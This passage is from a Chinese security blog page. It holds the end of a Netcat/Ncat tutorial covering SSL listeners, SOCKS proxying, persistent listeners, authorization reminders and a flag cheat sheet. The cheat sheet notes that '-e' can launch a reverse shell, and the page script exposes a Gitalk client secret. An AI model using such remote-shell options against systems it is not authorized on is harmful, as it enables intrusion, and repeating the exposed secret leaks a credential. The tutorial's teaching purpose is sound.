+<li><strong>生成证书</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365</span><br></pre></td></tr></table></figure></li>
+<li><strong>服务端</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 1234</span><br></pre></td></tr></table></figure></li>
+<li><strong>客户端</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --ssl 192.168.1.100 1234</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-代理穿透"><a href="#2-代理穿透" class="headerlink" title="2. 代理穿透"></a><strong>2. 代理穿透</strong></h4><p>通过SSH或HTTP代理连接目标：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --proxy 127.0.0.1:1080 --proxy-type socks5 192.168.1.100 80</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-持久监听（保持端口开放）"><a href="#3-持久监听（保持端口开放）" class="headerlink" title="3. 持久监听（保持端口开放）"></a><strong>3. 持久监听（保持端口开放）</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lkvp 1234                  <span class="comment"># -k: 接受多连接（适合长期服务）</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="四、安全注意事项"><a href="#四、安全注意事项" class="headerlink" title="四、安全注意事项"></a><strong>四、安全注意事项</strong></h3><ul>
+<li><strong>合法授权</strong>：禁止未经授权扫描或入侵他人网络。</li>
+<li><strong>防火墙控制</strong>：测试时在内网进行，避免开放公网端口暴露风险。</li>
+<li><strong>替换默认NC</strong>：使用 <code>ncat</code> 替代旧版，支持更安全的协议（如SSL）。</li>
+</ul>
+<hr>
+<h3 id="五、典型工作流程图"><a href="#五、典型工作流程图" class="headerlink" title="五、典型工作流程图"></a><strong>五、典型工作流程图</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+</span><br><span class="line">|   Netcat 服务端    |</span><br><span class="line">| (监听端口, 等待连接) |</span><br><span class="line">+-------------------+</span><br><span class="line">           |</span><br><span class="line">           | 建立连接</span><br><span class="line">           ↓</span><br><span class="line">+-------------------+</span><br><span class="line">|   Netcat 客户端    |</span><br><span class="line">| (发起连接, 发送数据) |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="六、命令速查表"><a href="#六、命令速查表" class="headerlink" title="六、命令速查表"></a><strong>六、命令速查表</strong></h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>监听模式（服务端）</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>显示详细信息（Verbose）</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>禁用DNS解析，加速操作</td>
+</tr>
+<tr>
+<td><code>-p 端口</code></td>
+<td>指定本地或远程端口</td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>使用UDP协议（默认TCP）</td>
+</tr>
+<tr>
+<td><code>-w 秒</code></td>
+<td>连接超时时间</td>
+</tr>
+<tr>
+<td><code>-e 程序</code></td>
+<td>连接后执行指定程序（如反向Shell）</td>
+</tr>
+</tbody></table>
+<hr>
+<p>通过灵活组合上述功能，Netcat 可满足大多数网络调试和应急维护需求。建议在虚拟机或内网环境练习操作！ 👨💻</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.jjyyo.com">老六</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.jjyyo.com/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/">http://blog.jjyyo.com/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://blog.jjyyo.com" target="_blank">半生烟雨半生僧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%98%B6%E6%AE%B5%E6%B3%95%E5%9B%BD/">网络安全-阶段法国</a></div><div class="post-share"><div class="social-share" data-image="https://image.baidu.com/search/down?url=https://tvax3.sinaimg.cn/large/9bd9b167gy1g4lhomn16qj21hc0xcx0e.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/06/wang-luo-an-quan/ji-chu-ru-men/web-qian-duan-ji-chu-zhi-shi/" title="web前端基础知识"><img class="cover" src="https://image.baidu.com/search/down?url=https://tvax1.sinaimg.cn/large/9bd9b167gy1g4c8q7qct5j21hc0u07m6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">web前端基础知识</div></div><div class="info-2"><div class="info-item-1">web基础概念知识Web基础概念知识详解1. 互联网与万维网（WWW） 互联网（Internet）: 全球互联的计算机网络，基于TCP&#x2F;IP协议族进行通信，包含硬件设备（路由、服务器）和协议（HTTP, FTP, SMTP）。  万维网（World Wide Web, WWW）: 基于互联网的信息共享系统，通过HTTP协议和超文本（HTML）链接资源，核心组件包括：  URL（资源定位符） HTTP&#x2F;HTTPS（传输协议） Web浏览器（客户端工具）  2. 网页核心三剑客     技术 角色 示例代码    HTML 定义页面结构 &lt;h1&gt;标题&lt;&#x2F;h1&gt;   CSS 控制样式与布局 body { background: #fff; }   JavaScript 实现动态交互 document.getElementById(“btn”).onclick &#x3D; () &#x3D;&gt; {…}   3. HTTP&#x2F;HTTPS协议 HTTP（超文本传输协议）: 无状态协议（每次请求独立） 请求方法：GET（获取资源）, POST（提交数据）, PUT, DELETE等。 状态码：200（成功）、404（未找到）、500（服务器错误）。   HTTPS: 加密版HTTP，使用SSL&#x2F;TLS协议保护传输安全。 加密流程： 客户端发起HTTPS请求。 服务器返回数字证书（含公钥）。 客户端验证证书并生成对称加密密钥。 双方使用对称密钥加密通信。      4....</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://img.jjyyo.com/file/头像/1743607786443_头像2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">老六</div><div class="author-info-description">天边明月清如许，不载红尘一点愁</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" href="https://blog.jjyyo.com"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/helipengye" target="_blank" title="我的GitHub"><i class="github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-%E7%8E%AF%E5%A2%83-%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF"><span class="toc-number">1.</span> <span class="toc-text">Docker 环境 + 宝塔面板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9C%A8-Windows-%E4%B8%8A%E5%AE%89%E8%A3%85-Docker-%E5%92%8C-Docker-Compose"><span class="toc-number">1.1.</span> <span class="toc-text">一、在 Windows 上安装 Docker 和 Docker Compose</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85-Docker-Desktop"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 安装 Docker Desktop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AE-WSL-2-%E5%90%8E%E7%AB%AF%EF%BC%88%E5%BF%85%E9%A1%BB%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 配置 WSL 2 后端（必须）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%9A%E8%BF%87-Docker-%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF"><span class="toc-number">1.2.</span> <span class="toc-text">二、通过 Docker 部署宝塔面板</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E4%B8%93%E7%94%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 创建专用目录和配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%90%AF%E5%8A%A8%E5%AE%9D%E5%A1%94%E5%AE%B9%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 启动宝塔容器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 获取宝塔面板登录信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%AE%BF%E9%97%AE%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. 访问宝塔面板</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81Windows-%E4%B8%93%E5%B1%9E%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.3.</span> <span class="toc-text">三、Windows 专属注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 文件路径问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 权限问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%98%B2%E7%81%AB%E5%A2%99%E6%94%BE%E8%A1%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 防火墙放行端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">四、宝塔面板兼容性问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E9%99%90%E5%88%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text">已知限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88"><span class="toc-number">1.4.2.</span> <span class="toc-text">替代方案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB"><span class="toc-number">1.5.</span> <span class="toc-text">五、常用命令汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%8D%B8%E8%BD%BD%E4%B8%8E%E6%B8%85%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">六、卸载与清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">Netcat使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%89%E8%A3%85Netcat"><span class="toc-number">2.1.</span> <span class="toc-text">一、安装Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%8D%E5%90%8C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">1. 不同系统的安装方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">2. 版本区别：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95%E4%B8%8E%E5%9C%BA%E6%99%AF"><span class="toc-number">2.2.</span> <span class="toc-text">二、基础用法与场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%88%E6%9B%BF%E4%BB%A3Telnet%EF%BC%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">1. 端口扫描（替代Telnet）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%AE%80%E5%8D%95%E8%81%8A%E5%A4%A9%E5%AE%A4%EF%BC%88TCP%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. 简单聊天室（TCP）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">2.2.3.</span> <span class="toc-text">3. 文件传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%8F%8D%E5%90%91Shell%EF%BC%88%E9%AB%98%E5%8D%B1%E6%93%8D%E4%BD%9C%EF%BC%8C%E4%BB%85%E7%94%A8%E4%BA%8E%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%EF%BC%89"><span class="toc-number">2.2.4.</span> <span class="toc-text">4. 反向Shell（高危操作，仅用于授权测试）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7%EF%BC%88Ncat%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">三、进阶技巧（Ncat）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%EF%BC%88SSL%EF%BC%89"><span class="toc-number">2.3.1.</span> <span class="toc-text">1. 加密通信（SSL）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F"><span class="toc-number">2.3.2.</span> <span class="toc-text">2. 代理穿透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8C%81%E4%B9%85%E7%9B%91%E5%90%AC%EF%BC%88%E4%BF%9D%E6%8C%81%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%EF%BC%89"><span class="toc-number">2.3.3.</span> <span class="toc-text">3. 持久监听（保持端口开放）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">2.4.</span> <span class="toc-text">四、安全注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%85%B8%E5%9E%8B%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">2.5.</span> <span class="toc-text">五、典型工作流程图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">2.6.</span> <span class="toc-text">六、命令速查表</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/" title="宝塔安装和Netcat使用"><img src="https://image.baidu.com/search/down?url=https://tvax3.sinaimg.cn/large/9bd9b167gy1g4lhomn16qj21hc0xcx0e.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="宝塔安装和Netcat使用"/></a><div class="content"><a class="title" href="/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/" title="宝塔安装和Netcat使用">宝塔安装和Netcat使用</a><time datetime="2025-05-12T12:27:35.000Z" title="发表于 2025-05-12 20:27:35">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/06/wang-luo-an-quan/ji-chu-ru-men/web-qian-duan-ji-chu-zhi-shi/" title="web前端基础知识"><img src="https://image.baidu.com/search/down?url=https://tvax1.sinaimg.cn/large/9bd9b167gy1g4c8q7qct5j21hc0u07m6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web前端基础知识"/></a><div class="content"><a class="title" href="/2025/04/06/wang-luo-an-quan/ji-chu-ru-men/web-qian-duan-ji-chu-zhi-shi/" title="web前端基础知识">web前端基础知识</a><time datetime="2025-04-06T03:09:35.000Z" title="发表于 2025-04-06 11:09:35">2025-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/wang-luo-an-quan/ji-chu-ru-men/linux-cao-zuo-xi-tong/" title="Linux操作系统"><img src="https://image.baidu.com/search/down?url=https://c-ssl.duitang.com/uploads/blog/202009/30/20200930203751_1c00a.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux操作系统"/></a><div class="content"><a class="title" href="/2025/04/05/wang-luo-an-quan/ji-chu-ru-men/linux-cao-zuo-xi-tong/" title="Linux操作系统">Linux操作系统</a><time datetime="2025-04-05T12:27:35.000Z" title="发表于 2025-04-05 20:27:35">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/wang-luo-an-quan/ji-chu-ru-men/ji-suan-ji-wang-luo/" title="计算机网络"><img src="https://image.baidu.com/search/down?url=https://tvax1.sinaimg.cn/large/0072Vf1pgy1foxkj2ashuj31kw0w0hcp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计算机网络"/></a><div class="content"><a class="title" href="/2025/04/05/wang-luo-an-quan/ji-chu-ru-men/ji-suan-ji-wang-luo/" title="计算机网络">计算机网络</a><time datetime="2025-04-05T12:27:35.000Z" title="发表于 2025-04-05 20:27:35">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/wang-luo-an-quan/ji-chu-ru-men/windows-cao-zuo-xi-tong/" title="Windows操作系统"><img src="https://image.baidu.com/search/down?url=https://tvax1.sinaimg.cn/large/0072Vf1pgy1foxk6hzndqj31kw0w0b0q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows操作系统"/></a><div class="content"><a class="title" href="/2025/04/05/wang-luo-an-quan/ji-chu-ru-men/windows-cao-zuo-xi-tong/" title="Windows操作系统">Windows操作系统</a><time datetime="2025-04-05T08:45:35.000Z" title="发表于 2025-04-05 16:45:35">2025-04-05</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(to right, #eea2a2 0%, #bbc1bf 19%, #57c6e1 42%, #b49fda 79%, #7ac5d8 100%);"><div id="footer-wrap"><div class="copyright">&copy;2025 By 老六</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  const initGitalk = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGitalk = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const gitalk = new Gitalk({
+      clientID: 'Ov23liSCErjpEvCi1t1l',
+      clientSecret: '822f87a9aeb7631f95b8000bf9dbe48b2fac24a1',
+      repo: 'hexo_blog',
+      owner: 'helipengye',
+      admin: ['helipengye'],
+      updateCountCallback: commentCount,
+      ...option,
+      id: isShuoshuo ? path : (option && option.id) || 'fc4a3ee5a4407ed047d27e0a39132cc2'
+    })
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async(el, path) => {
+    if (typeof Gitalk === 'function') initGitalk(el, path)
+    else {
+      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
+      initGitalk(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Gitalk' === 'Gitalk'
+      ? window.shuoshuoComment = { loadComment: loadGitalk }
+      : window.loadOtherComment = loadGitalk
+    return
+  }
+
+  if ('Gitalk' === 'Gitalk' || !false) {
+    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
+})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="http://blog.jjyyo.com/categories/网络安全/基础入门/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📚 网络安全 (4)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://blog.jjyyo.com/categories/博客/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🎮 博客相关教程 (2)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://blog.jjyyo.com/categories/Windows/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🐱‍👓 Windows分类教程 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item" style="visibility: hidden"></div><a class="magnet_link_more"  href="http://blog.jjyyo.com/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #b30070}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
